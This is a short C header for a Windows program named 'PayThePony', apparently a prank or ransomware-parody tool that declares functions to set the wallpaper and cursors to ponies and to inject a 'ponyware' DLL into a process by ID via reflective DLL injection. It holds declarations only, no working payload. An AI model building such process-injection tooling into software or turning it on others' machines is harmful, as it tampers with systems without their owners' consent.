#ifndef PAYTHEPONY_H
#define PAYTHEPONY_H

// must be included before Windows.h to use OCR constants for system cursors
#define OEMRESOURCE

#include <stdlib.h>
#include <stdio.h>
#include <Windows.h>

#include "resource.h"
#include "../common/winUtils.h"
#include "../common/ReflectiveDLLInjection/inject/src/LoadLibraryR.h"

#define NUM_REQUIRED_ARGS 1
#define WALLPAPER_RANDNAME_SIZE 8

static const WCHAR *wallpaperLoc = L"%APPDATA%\\";

void printHelp();
void setWallpaperToPonies();
void setCursorToPonies();
void injectPonywareDll(DWORD pid);

#endif // PAYTHEPONY_H